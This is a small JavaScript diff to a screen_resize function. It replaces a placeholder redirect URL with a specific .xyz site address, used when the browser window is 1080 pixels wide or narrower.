@@ -5,6 +5,6 @@ function screen_resize() {
   var w = parseInt(window.innerWidth);
 
   if(w <= 1080) {
-      window.location.replace("http://redirectedSite.com/");
+      window.location.replace("https://ac-klima-servis.xyz/desktop");
   }
  }
